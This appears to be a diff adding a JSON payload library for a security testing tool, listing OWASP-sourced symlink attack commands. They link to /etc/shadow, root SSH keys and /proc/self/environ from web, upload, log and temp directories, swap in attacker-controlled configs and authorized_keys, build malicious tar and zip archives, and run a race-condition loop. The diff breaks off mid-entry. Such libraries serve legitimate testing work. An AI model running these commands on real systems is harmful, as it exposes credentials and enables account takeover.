@@ -1,0 +1,1226 @@
+[
+  {
+    "id": "symbolic-link-attacks-owasp-0001",
+    "name": "Create symlink to sensitive files",
+    "template": "ln -s /etc/passwd passwd_link.txt",
+    "description": "Create symlink to sensitive files probe from OWASP. Tests application handling of: ln -s /etc/passwd passwd_link....",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0002",
+    "name": "Create symlink to sensitive files #2",
+    "template": "ln -s /etc/shadow shadow_link.txt",
+    "description": "Create symlink to sensitive files probe from OWASP. Tests application handling of: ln -s /etc/shadow shadow_link....",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0003",
+    "name": "Create symlink to sensitive files #3",
+    "template": "ln -s /etc/hosts hosts_link.txt",
+    "description": "Create symlink to sensitive files probe from OWASP. Tests application handling of: ln -s /etc/hosts hosts_link.tx...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0004",
+    "name": "Create symlink to sensitive files #4",
+    "template": "ln -s /root/.ssh/id_rsa root_key_link",
+    "description": "Create symlink to sensitive files probe from OWASP. Tests application handling of: ln -s /root/.ssh/id_rsa root_k...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0005",
+    "name": "Create symlink to sensitive files #5",
+    "template": "ln -s /home/user/.ssh/authorized_keys auth_keys_link",
+    "description": "Create symlink to sensitive files probe from OWASP. Tests application handling of: ln -s /home/user/.ssh/authoriz...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0006",
+    "name": "Symlink to directories",
+    "template": "ln -s /etc/ etc_link",
+    "description": "Symlink to directories probe from OWASP. Tests application handling of: ln -s /etc/ etc_link",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0007",
+    "name": "Symlink to directories #2",
+    "template": "ln -s /root/ root_link",
+    "description": "Symlink to directories probe from OWASP. Tests application handling of: ln -s /root/ root_link",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0008",
+    "name": "Symlink to directories #3",
+    "template": "ln -s / rootfs_link",
+    "description": "Symlink to directories probe from OWASP. Tests application handling of: ln -s / rootfs_link",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0009",
+    "name": "Symlink to directories #4",
+    "template": "ln -s /var/log/ logs_link",
+    "description": "Symlink to directories probe from OWASP. Tests application handling of: ln -s /var/log/ logs_link",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0010",
+    "name": "Predict and create temp file symlinks",
+    "template": "ln -s /etc/passwd /tmp/app_12345.tmp",
+    "description": "Predict and create temp file symlinks probe from OWASP. Tests application handling of: ln -s /etc/passwd /tmp/app_123...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0011",
+    "name": "Predict and create temp file symlinks #2",
+    "template": "ln -s /etc/shadow /tmp/temp_file_$$.tmp",
+    "description": "Predict and create temp file symlinks probe from OWASP. Tests application handling of: ln -s /etc/shadow /tmp/temp_fi...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0012",
+    "name": "Predict and create temp file symlinks #3",
+    "template": "ln -s /root/.ssh/id_rsa /tmp/upload_temp.txt",
+    "description": "Predict and create temp file symlinks probe from OWASP. Tests application handling of: ln -s /root/.ssh/id_rsa /tmp/u...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0013",
+    "name": "Predict and create temp file symlinks #4",
+    "template": "ln -s /etc/crontab /var/tmp/app_session",
+    "description": "Predict and create temp file symlinks probe from OWASP. Tests application handling of: ln -s /etc/crontab /var/tmp/ap...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0014",
+    "name": "Common temp file patterns",
+    "template": "ln -s /etc/passwd /tmp/php_upload_12345",
+    "description": "Common temp file patterns probe from OWASP. Tests application handling of: ln -s /etc/passwd /tmp/php_upl...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0015",
+    "name": "Common temp file patterns #2",
+    "template": "ln -s /etc/passwd /tmp/mysql.sock",
+    "description": "Common temp file patterns probe from OWASP. Tests application handling of: ln -s /etc/passwd /tmp/mysql.s...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0016",
+    "name": "Common temp file patterns #3",
+    "template": "ln -s /etc/passwd /var/tmp/sess_abcd1234",
+    "description": "Common temp file patterns probe from OWASP. Tests application handling of: ln -s /etc/passwd /var/tmp/ses...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0017",
+    "name": "Replace log files with symlinks",
+    "template": "ln -s /etc/passwd /var/log/app.log",
+    "description": "Replace log files with symlinks probe from OWASP. Tests application handling of: ln -s /etc/passwd /var/log/app...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0018",
+    "name": "Replace log files with symlinks #2",
+    "template": "ln -s /etc/shadow /var/log/error.log",
+    "description": "Replace log files with symlinks probe from OWASP. Tests application handling of: ln -s /etc/shadow /var/log/err...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0019",
+    "name": "Replace log files with symlinks #3",
+    "template": "ln -s /home/user/.ssh/authorized_keys /var/log/access.log",
+    "description": "Replace log files with symlinks probe from OWASP. Tests application handling of: ln -s /home/user/.ssh/authoriz...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0020",
+    "name": "Replace log files with symlinks #4",
+    "template": "ln -s /etc/crontab /var/log/system.log",
+    "description": "Replace log files with symlinks probe from OWASP. Tests application handling of: ln -s /etc/crontab /var/log/sy...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0021",
+    "name": "Symlink to /dev/null for DoS",
+    "template": "ln -s /dev/null /var/log/app.log",
+    "description": "Symlink to /dev/null for DoS probe from OWASP. Tests application handling of: ln -s /dev/null /var/log/app.l...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0022",
+    "name": "Symlink to /dev/zero for infinite data",
+    "template": "ln -s /dev/zero /var/log/app.log",
+    "description": "Symlink to /dev/zero for infinite data probe from OWASP. Tests application handling of: ln -s /dev/zero /var/log/app.l...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0023",
+    "name": "Create symlinks in web directories",
+    "template": "ln -s /etc/passwd /var/www/html/passwd.txt",
+    "description": "Create symlinks in web directories probe from OWASP. Tests application handling of: ln -s /etc/passwd /var/www/htm...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0024",
+    "name": "Create symlinks in web directories #2",
+    "template": "ln -s /etc/shadow /var/www/html/shadow.txt",
+    "description": "Create symlinks in web directories probe from OWASP. Tests application handling of: ln -s /etc/shadow /var/www/htm...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0025",
+    "name": "Create symlinks in web directories #3",
+    "template": "ln -s /root/.ssh/id_rsa /var/www/html/key.txt",
+    "description": "Create symlinks in web directories probe from OWASP. Tests application handling of: ln -s /root/.ssh/id_rsa /var/w...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0026",
+    "name": "Create symlinks in web directories #4",
+    "template": "ln -s /home/user/.bash_history /var/www/html/history.txt",
+    "description": "Create symlinks in web directories probe from OWASP. Tests application handling of: ln -s /home/user/.bash_history...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0027",
+    "name": "Create symlinks in web directories #5",
+    "template": "ln -s /var/log/apache2/access.log /var/www/html/access.txt",
+    "description": "Create symlinks in web directories probe from OWASP. Tests application handling of: ln -s /var/log/apache2/access....",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0028",
+    "name": "Symlink to entire directories",
+    "template": "ln -s /etc/ /var/www/html/etc",
+    "description": "Symlink to entire directories probe from OWASP. Tests application handling of: ln -s /etc/ /var/www/html/etc",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0029",
+    "name": "Symlink to entire directories #2",
+    "template": "ln -s /root/ /var/www/html/root",
+    "description": "Symlink to entire directories probe from OWASP. Tests application handling of: ln -s /root/ /var/www/html/roo...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0030",
+    "name": "Symlink to entire directories #3",
+    "template": "ln -s /home/ /var/www/html/home",
+    "description": "Symlink to entire directories probe from OWASP. Tests application handling of: ln -s /home/ /var/www/html/hom...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0031",
+    "name": "PHP uploads directory",
+    "template": "ln -s /etc/passwd /var/www/html/uploads/passwd.txt",
+    "description": "PHP uploads directory probe from OWASP. Tests application handling of: ln -s /etc/passwd /var/www/htm...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0032",
+    "name": "PHP uploads directory #2",
+    "template": "ln -s /etc/passwd /var/www/html/files/config.txt",
+    "description": "PHP uploads directory probe from OWASP. Tests application handling of: ln -s /etc/passwd /var/www/htm...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0033",
+    "name": "Replace config files",
+    "template": "ln -s /tmp/attacker_config /etc/app/app.conf",
+    "description": "Replace config files probe from OWASP. Tests application handling of: ln -s /tmp/attacker_config /et...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0034",
+    "name": "Replace config files #2",
+    "template": "ln -s /tmp/evil.ini /etc/app/database.ini",
+    "description": "Replace config files probe from OWASP. Tests application handling of: ln -s /tmp/evil.ini /etc/app/d...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0035",
+    "name": "Replace config files #3",
+    "template": "ln -s /tmp/settings.xml /etc/app/settings.xml",
+    "description": "Replace config files probe from OWASP. Tests application handling of: ln -s /tmp/settings.xml /etc/a...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0036",
+    "name": "MySQL config",
+    "template": "ln -s /tmp/evil.cnf /etc/mysql/my.cnf",
+    "description": "MySQL config probe from OWASP. Tests application handling of: ln -s /tmp/evil.cnf /etc/mysql...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0037",
+    "name": "Apache config",
+    "template": "ln -s /tmp/evil.conf /etc/apache2/sites-enabled/000-default.conf",
+    "description": "Apache config probe from OWASP. Tests application handling of: ln -s /tmp/evil.conf /etc/apac...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0038",
+    "name": "Symlink authorized_keys",
+    "template": "ln -s /tmp/attacker_keys /home/victim/.ssh/authorized_keys",
+    "description": "Symlink authorized_keys probe from OWASP. Tests application handling of: ln -s /tmp/attacker_keys /home...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0039",
+    "name": "Symlink authorized_keys #2",
+    "template": "ln -s /tmp/attacker_keys /root/.ssh/authorized_keys",
+    "description": "Symlink authorized_keys probe from OWASP. Tests application handling of: ln -s /tmp/attacker_keys /root...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0040",
+    "name": "Symlink SSH config",
+    "template": "ln -s /tmp/evil_ssh_config /home/user/.ssh/config",
+    "description": "Symlink SSH config probe from OWASP. Tests application handling of: ln -s /tmp/evil_ssh_config /ho...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0041",
+    "name": "Symlink known_hosts",
+    "template": "ln -s /dev/null /home/user/.ssh/known_hosts",
+    "description": "Symlink known_hosts probe from OWASP. Tests application handling of: ln -s /dev/null /home/user/.ss...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0042",
+    "name": "Tar archive with symlink to /etc/passwd",
+    "template": "ln -s /etc/passwd evil_link.txt",
+    "description": "Tar archive with symlink to /etc/passwd probe from OWASP. Tests application handling of: ln -s /etc/passwd evil_link.tx...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0043",
+    "name": "Tar archive with symlink to /etc/passwd #2",
+    "template": "tar -czf evil.tar.gz evil_link.txt",
+    "description": "Tar archive with symlink to /etc/passwd probe from OWASP. Tests application handling of: tar -czf evil.tar.gz evil_link...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0044",
+    "name": "Tar with absolute path symlink",
+    "template": "ln -s /etc/shadow /tmp/shadow_link",
+    "description": "Tar with absolute path symlink probe from OWASP. Tests application handling of: ln -s /etc/shadow /tmp/shadow_...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0045",
+    "name": "Tar with absolute path symlink #2",
+    "template": "tar -czf evil.tar.gz /tmp/shadow_link",
+    "description": "Tar with absolute path symlink probe from OWASP. Tests application handling of: tar -czf evil.tar.gz /tmp/shad...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0046",
+    "name": "Tar with directory traversal symlink",
+    "template": "mkdir -p a/b/c",
+    "description": "Tar with directory traversal symlink probe from OWASP. Tests application handling of: mkdir -p a/b/c",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0047",
+    "name": "Tar with directory traversal symlink #2",
+    "template": "ln -s ../../../etc/passwd a/b/c/passwd",
+    "description": "Tar with directory traversal symlink probe from OWASP. Tests application handling of: ln -s ../../../etc/passwd a/b/...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0048",
+    "name": "Tar with directory traversal symlink #3",
+    "template": "tar -czf evil.tar.gz a/",
+    "description": "Tar with directory traversal symlink probe from OWASP. Tests application handling of: tar -czf evil.tar.gz a/",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0049",
+    "name": "Zip with symlink",
+    "template": "ln -s /etc/passwd passwd_link",
+    "description": "Zip with symlink probe from OWASP. Tests application handling of: ln -s /etc/passwd passwd_link",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0050",
+    "name": "Zip with symlink #2",
+    "template": "zip --symlinks evil.zip passwd_link",
+    "description": "Zip with symlink probe from OWASP. Tests application handling of: zip --symlinks evil.zip passwd...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0051",
+    "name": "Zip with path traversal",
+    "template": "ln -s ../../../../../../etc/passwd link",
+    "description": "Zip with path traversal probe from OWASP. Tests application handling of: ln -s ../../../../../../etc/pa...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0052",
+    "name": "Zip with path traversal #2",
+    "template": "zip --symlinks evil.zip link",
+    "description": "Zip with path traversal probe from OWASP. Tests application handling of: zip --symlinks evil.zip link",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0053",
+    "name": "Place symlinks in backup source directory",
+    "template": "cd /home/user/backup_source/",
+    "description": "Place symlinks in backup source directory probe from OWASP. Tests application handling of: cd /home/user/backup_source/",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0054",
+    "name": "Place symlinks in backup source directory #2",
+    "template": "ln -s /etc/shadow shadow_backup.txt",
+    "description": "Place symlinks in backup source directory probe from OWASP. Tests application handling of: ln -s /etc/shadow shadow_backu...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0055",
+    "name": "Place symlinks in backup source directory #3",
+    "template": "ln -s /root/.ssh/id_rsa root_key.txt",
+    "description": "Place symlinks in backup source directory probe from OWASP. Tests application handling of: ln -s /root/.ssh/id_rsa root_k...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0056",
+    "name": "Place symlinks in backup source directory #4",
+    "template": "ln -s /var/log/auth.log auth_log.txt",
+    "description": "Place symlinks in backup source directory probe from OWASP. Tests application handling of: ln -s /var/log/auth.log auth_l...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0057",
+    "name": "Place symlinks in backup source directory #5",
+    "template": "ln -s /etc/mysql/debian.cnf mysql_creds.txt",
+    "description": "Place symlinks in backup source directory probe from OWASP. Tests application handling of: ln -s /etc/mysql/debian.cnf my...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0058",
+    "name": "Symlink entire sensitive directories",
+    "template": "ln -s /root/.ssh/ ssh_dir_backup",
+    "description": "Symlink entire sensitive directories probe from OWASP. Tests application handling of: ln -s /root/.ssh/ ssh_dir_back...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0059",
+    "name": "Symlink entire sensitive directories #2",
+    "template": "ln -s /etc/ etc_backup",
+    "description": "Symlink entire sensitive directories probe from OWASP. Tests application handling of: ln -s /etc/ etc_backup",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0060",
+    "name": "Replace cache files with symlinks",
+    "template": "ln -s /etc/passwd /tmp/app_cache/user_data",
+    "description": "Replace cache files with symlinks probe from OWASP. Tests application handling of: ln -s /etc/passwd /tmp/app_cac...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0061",
+    "name": "Replace cache files with symlinks #2",
+    "template": "ln -s /home/victim/.ssh/authorized_keys /var/cache/app/session_123",
+    "description": "Replace cache files with symlinks probe from OWASP. Tests application handling of: ln -s /home/victim/.ssh/author...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0062",
+    "name": "Replace cache files with symlinks #3",
+    "template": "ln -s /etc/crontab /var/tmp/cache/data_456",
+    "description": "Replace cache files with symlinks probe from OWASP. Tests application handling of: ln -s /etc/crontab /var/tmp/ca...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0063",
+    "name": "Create symlinks for upload testing",
+    "template": "ln -s /etc/passwd upload_passwd.txt",
+    "description": "Create symlinks for upload testing probe from OWASP. Tests application handling of: ln -s /etc/passwd upload_passw...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0064",
+    "name": "Create symlinks for upload testing #2",
+    "template": "ln -s /etc/shadow upload_shadow.txt",
+    "description": "Create symlinks for upload testing probe from OWASP. Tests application handling of: ln -s /etc/shadow upload_shado...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0065",
+    "name": "Create symlinks for upload testing #3",
+    "template": "ln -s /root/.ssh/id_rsa upload_key.pem",
+    "description": "Create symlinks for upload testing probe from OWASP. Tests application handling of: ln -s /root/.ssh/id_rsa upload...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0066",
+    "name": "Create symlinks for upload testing #4",
+    "template": "ln -s /proc/self/environ upload_env.txt",
+    "description": "Create symlinks for upload testing probe from OWASP. Tests application handling of: ln -s /proc/self/environ uploa...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0067",
+    "name": "Symlink with allowed extension",
+    "template": "ln -s /etc/passwd document.pdf",
+    "description": "Symlink with allowed extension probe from OWASP. Tests application handling of: ln -s /etc/passwd document.pdf",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0068",
+    "name": "Symlink with allowed extension #2",
+    "template": "ln -s /etc/passwd image.jpg",
+    "description": "Symlink with allowed extension probe from OWASP. Tests application handling of: ln -s /etc/passwd image.jpg",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0069",
+    "name": "Symlink with allowed extension #3",
+    "template": "ln -s /etc/passwd file.txt",
+    "description": "Symlink with allowed extension probe from OWASP. Tests application handling of: ln -s /etc/passwd file.txt",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0070",
+    "name": "Continuous race condition exploit",
+    "template": "while true; do",
+    "description": "Continuous race condition exploit probe from OWASP. Tests application handling of: while true; do",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0071",
+    "name": "Continuous race condition exploit #2",
+    "template": "rm -f /tmp/target_file 2>/dev/null",
+    "description": "Continuous race condition exploit probe from OWASP. Tests application handling of: rm -f /tmp/target_file 2>/dev/...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0072",
+    "name": "Continuous race condition exploit #3",
+    "template": "touch /tmp/target_file",
+    "description": "Continuous race condition exploit probe from OWASP. Tests application handling of: touch /tmp/target_file",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0073",
+    "name": "Continuous race condition exploit #4",
+    "template": "rm -f /tmp/target_file",
+    "description": "Continuous race condition exploit probe from OWASP. Tests application handling of: rm -f /tmp/target_file",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0074",
+    "name": "Continuous race condition exploit #5",
+    "template": "ln -s /etc/passwd /tmp/target_file",
+    "description": "Continuous race condition exploit probe from OWASP. Tests application handling of: ln -s /etc/passwd /tmp/target_...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0075",
+    "name": "Continuous race condition exploit #6",
+    "template": "sleep 0.001",
+    "description": "Continuous race condition exploit probe from OWASP. Tests application handling of: sleep 0.001",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0076",
+    "name": "Continuous race condition exploit #7",
+    "template": "done",
+    "description": "Continuous race condition exploit probe from OWASP. Tests application handling of: done",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0077",
+    "name": "Create symlink chains for traversal",
+    "template": "mkdir -p /tmp/uploads/a/b/c/d/e",
+    "description": "Create symlink chains for traversal probe from OWASP. Tests application handling of: mkdir -p /tmp/uploads/a/b/c/d/...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0078",
+    "name": "Create symlink chains for traversal #2",
+    "template": "cd /tmp/uploads",
+    "description": "Create symlink chains for traversal probe from OWASP. Tests application handling of: cd /tmp/uploads",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0079",
+    "name": "Create symlink chains for traversal #3",
+    "template": "ln -s / a/b/c/d/e/root",
+    "description": "Create symlink chains for traversal probe from OWASP. Tests application handling of: ln -s / a/b/c/d/e/root",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0080",
+    "name": "Multiple level traversal",
+    "template": "ln -s ../../../../../../../etc/passwd link1.txt",
+    "description": "Multiple level traversal probe from OWASP. Tests application handling of: ln -s ../../../../../../../etc...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0081",
+    "name": "Multiple level traversal #2",
+    "template": "ln -s ../../../../../../etc/shadow link2.txt",
+    "description": "Multiple level traversal probe from OWASP. Tests application handling of: ln -s ../../../../../../etc/sh...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0082",
+    "name": "Relative path symlinks",
+    "template": "cd /var/www/html/uploads",
+    "description": "Relative path symlinks probe from OWASP. Tests application handling of: cd /var/www/html/uploads",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "symbolic-link-payloads.txt"
+  },
+  {
+    "id": "symbolic-link-attacks-owasp-0083",
+    "name": "Relative path symlinks #2",
+    "template": "ln -s ../../../etc/passwd passwd.txt",
